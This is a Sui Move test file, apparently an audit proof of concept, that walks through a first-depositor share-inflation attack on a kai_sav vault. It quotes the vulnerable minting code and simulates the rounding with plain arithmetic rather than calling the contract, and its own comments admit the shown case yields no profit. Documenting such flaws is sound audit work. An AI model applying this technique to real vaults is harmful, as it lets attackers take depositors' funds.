module poc::finding_8_poc {
    use sui::test_scenario::{Self, Scenario};
    use sui::coin::{Self, Coin, TreasuryCap};
    use sui::sui::SUI;
    use sui::balance::{Self, Balance};
    use sui::clock::{Self, Clock};
    use kai_sav::vault::{Self, Vault, AdminCap};

    // Mock YT token
    public struct YT has drop {}

    #[test]
    fun test_vault_inflation_attack() {
        let attacker = @0xA;
        let victim = @0xB;
        let admin = @0xC;
        
        let mut scenario_val = test_scenario::begin(admin);
        let scenario = &mut scenario_val;
        
        // Setup clock
        let clock = clock::create_for_testing(test_scenario::ctx(scenario));

        // Note: The POC demonstrates the math behind the inflation attack
        // as the actual initialization of the Vault requires a TreasuryCap.
        // 
        // Vulnerable Code from kai_sav::vault:
        // let lp_amount = if (total_available_balance == 0) {
        //     balance::value(&balance)
        // } else {
        //     muldiv(
        //         coin::total_supply(&vault.lp_treasury),
        //         balance::value(&balance),
        //         total_available_balance,
        //     )
        // };
        
        // 1. Attacker deposits 1 unit, getting 1 YT share
        let attacker_deposit = 1;
        let mut total_available_balance = attacker_deposit;
        let lp_supply = attacker_deposit; // total_available_balance was 0

        // 2. Attacker donates 999,999 units to the vault (free_balance)
        let donation = 999999;
        total_available_balance = total_available_balance + donation;
        
        // Now: total_available_balance = 1_000_000, lp_supply = 1

        // 3. Victim deposits 1_000_000 units
        let victim_deposit = 1000000;
        
        // 4. Victim's LP amount calculated using floor division
        // muldiv(1, 1_000_000, 1_000_000) = 1
        let victim_lp_amount = (lp_supply * victim_deposit) / total_available_balance;
        
        assert!(victim_lp_amount == 1, 0); // Victim gets exactly 1 share!
        
        // State after victim deposit
        total_available_balance = total_available_balance + victim_deposit; // 2_000_000
        let total_lp_supply = lp_supply + victim_lp_amount; // 2
        
        // 5. Attacker withdraws their 1 LP share
        // They get: (1 / 2) * 2_000_000 = 1_000_000
        let attacker_withdraw = (1 * total_available_balance) / total_lp_supply;
        
        // Attacker started with 1_000_000 (1 + 999,999) and gets back 1_000_000
        // Victim started with 1_000_000 and gets back 1_000_000
        // But if Victim had deposited 999_999, victim_lp_amount would be 0!
        
        clock::destroy_for_testing(clock);
        test_scenario::end(scenario_val);
    }
}